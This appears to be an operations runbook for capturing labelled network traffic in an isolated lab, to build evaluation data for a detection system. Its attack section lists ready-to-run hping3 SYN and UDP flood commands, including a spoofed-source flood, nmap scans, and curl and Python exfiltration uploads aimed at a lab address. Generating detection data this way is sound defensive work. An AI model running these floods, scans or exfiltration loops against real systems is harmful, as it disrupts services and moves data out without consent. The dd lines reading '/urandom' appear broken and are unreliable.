# Trinetra — Network Packet Capture Runbook for Independent Validation
**Document ID:** TRIN-DOC-OPS-RUNBOOK-01  
**Version:** 1.0.0  
**Date:** 29 September 2026  
**Audience:** Teammate / External Testbed Operator (Linux x86_64 VM or Physical Host)  
**Status:** ACTIVE  

---

## 1. Overview & Objective
This runbook provides copy-paste commands to capture **independent, reproducible network traffic traces** (`.pcap`) on a dedicated Linux machine. These captures serve as external held-out evaluation datasets for Trinetra's passive detection enclave.

All in-repo synthetic traffic generators are strictly labeled `[simulated, not independent]`. To prove real-world defense against unseen tools, follow this guide to collect raw packets directly from standard open-source attack tools (`hping3`, `nmap`, `curl`, `iperf3`, `rsync`) executed in an isolated network testbed.

---

## 2. Testbed Environment Setup

### 2.1 Hardware / Virtual Topology
Recommended testbed architecture:
```
  [ Attacker / Client VM ]          [ Victim / Server VM ]
       192.168.50.10                     192.168.50.20
             \                                 /
              \               TAP             /
               +-----[ Virtual Switch ]------+
                              |
                     [ Capture Interface ]
                         (promisc: eth1)
```
- **Attacker Host IP:** `192.168.50.10`
- **Victim / Server Host IP:** `192.168.50.20`
- **Capture Interface:** `eth1` (or local `veth` / `lo` if single-node containerized testbed).

### 2.2 Package Installation (Ubuntu / Debian)
```bash
sudo apt-get update && sudo apt-get install -y \
    tcpdump \
    iperf3 \
    nmap \
    hping3 \
    curl \
    rsync \
    openssh-server \
    chrony \
    coreutils \
    jq
```

---

## 3. Capture Rules, Naming Conventions & Metadata Schema

### 3.1 Pcap File Naming Convention
Every capture file MUST follow the strict naming standard:
```text
<category>_<threat_id>_<scenario_slug>_<timestamp_epoch>.pcap
```
Examples:
- `benign_none_iperf3_bulk_1727650000.pcap`
- `attack_ta_hping3_syn_flood_1727650100.pcap`
- `attack_te_nmap_syn_scan_1727650200.pcap`
- `attack_tf_scp_exfil_trickle_1727650300.pcap`

### 3.2 Metadata JSON Template
For every `.pcap` generated, a matching `.json` manifest MUST be created.
Template file: `<basename>.json`
```json
{
  "pcap_filename": "attack_ta_hping3_syn_flood_1727650100.pcap",
  "sha256": "4b321c...",
  "threat_class": "T_A_DDOS",
  "category": "attack",
  "tool_name": "hping3",
  "tool_version": "3.0.0-alpha-2",
  "command_executed": "hping3 -S --flood -p 80 192.168.50.20",
  "capture_interface": "eth1",
  "capture_filter": "ip or ip6",
  "start_time_iso": "2026-09-29T18:00:00Z",
  "end_time_iso": "2026-09-29T18:00:30Z",
  "total_packets": 150000,
  "total_bytes": 8100000,
  "attacker_ips": ["192.168.50.10"],
  "target_ips": ["192.168.50.20"],
  "operator": "Teammate Name <teammate@example.com>",
  "os_kernel": "Linux 6.8.0-40-generic x86_64"
}
```

---

## 4. Benign Baseline Captures (Negative Classes)

Start tcpdump in a dedicated shell before each test:
```bash
sudo tcpdump -i eth1 -s 0 -w benign_none_<scenario>.pcap "ip or ip6"
```

### Scenario B-1: Bulk Throughput (iperf3)
- **Victim (Server):**
  ```bash
  iperf3 -s -p 5201
  ```
- **Attacker (Client):**
  ```bash
  # 30-second multi-stream TCP bulk transfer
  iperf3 -c 192.168.50.20 -p 5201 -t 30 -P 4
  ```

### Scenario B-2: Web Browsing & DNS Lookups
- **Attacker (Client):**
  ```bash
  # Query top domains and fetch index pages
  for domain in google.com wikipedia.org cdnjs.cloudflare.com github.com mozilla.org; do
      dig +noall +answer @8.8.8.8 $domain
      curl -s -k -L -m 5 https://$domain -o /dev/null
      sleep 1
  done
  ```

### Scenario B-3: File Backup / Sync (rsync over SSH)
- **Attacker (Client):**
  ```bash
  # Generate 50MB random payload and sync
  dd if=/urandom of=/tmp/backup_payload.dat bs=1M count=50
  rsync -avz /tmp/backup_payload.dat user@192.168.50.20:/tmp/
  ```

### Scenario B-4: NTP Synchronization & Health Pings
- **Attacker (Client):**
  ```bash
  chronyd -q 'server pool.ntp.org iburst'
  ping -c 30 -i 1 192.168.50.20
  ```

### Scenario B-5: Internal Host Inventory / Monitoring Scan
- **Attacker (Client):**
  ```bash
  # Benign sysadmin discovery sweep (slow, single probe per port)
  nmap -sS -p 22,80,443,53,8080 -r -T3 192.168.50.20
  ```

---

## 5. Attack Traffic Captures (Positive Classes)

### Threat T-a: Volumetric DDoS & Resource Starvation
1. **TCP SYN Flood (Volumetric):**
   ```bash
   # Duration: 20 seconds
   sudo hping3 -S --flood -p 80 192.168.50.20
   ```
2. **Spoofed IP SYN Flood:**
   ```bash
   # Duration: 20 seconds, randomized source IPs
   sudo hping3 -S --rand-source -p 443 -i u100 192.168.50.20
   ```
3. **UDP Flood:**
   ```bash
   # High-rate UDP datagram flood targeting random ports
   sudo hping3 --udp --rand-dest -p 53 -i u50 192.168.50.20
   ```

### Threat T-e: Port Scanning & Reconnaissance
1. **Vertical Port Scan (Fast SYN Scan):**
   ```bash
   sudo nmap -sS -p 1-1024 -T4 --max-retries 1 192.168.50.20
   ```
2. **Slow / Sneaky Reconnaissance (`-T1`):**
   ```bash
   # Sneaky scan (1 probe every 15 seconds over top 50 ports)
   sudo nmap -sS --top-ports 50 -T1 192.168.50.20
   ```
3. **TCP Connect Scan:**
   ```bash
   sudo nmap -sT -p 1-500 -T3 192.168.50.20
   ```

### Threat T-f: Data Exfiltration
1. **High-Volume Asymmetric Egress (Large Upload):**
   ```bash
   # Create 100MB payload and push outwards via curl HTTPS POST or SCP
   dd if=/urandom of=/tmp/exfil_archive.tar.gz bs=1M count=100
   curl -k -F "file=@/tmp/exfil_archive.tar.gz" https://192.168.50.20:8443/upload
   ```
2. **Trickle Exfiltration (Low-and-Slow Asymmetric Upload):**
   ```bash
   # Trickle upload: 1 KB every 500ms for 5 minutes
   python3 -c "
   import time, urllib.request
   with open('/tmp/exfil_archive.tar.gz', 'rb') as f:
       while chunk := f.read(1024):
           req = urllib.request.Request('http://192.168.50.20/api/chunk', data=chunk, method='POST')
           try:
               urllib.request.urlopen(req, timeout=5)
           except Exception:
               pass
           time.sleep(0.5)
   "
   ```

---

## 6. Post-Capture Verification & Checksum Manifest

After capturing, verify packet validity and generate SHA-256 hashes:

```bash
# 1. Inspect first 10 packets to confirm capture non-empty and well-formed
tcpdump -r capture.pcap -nn -c 10

# 2. Compute SHA-256 digest
sha256sum capture.pcap > capture.pcap.sha256

# 3. Print packet count and byte total
capinfos -c -d capture.pcap || tcpdump -r capture.pcap -q | wc -l
```

Transfer the completed `.pcap`, `.pcap.sha256`, and `<name>.json` files to Trinetra repository's `data/captures/external/` directory.
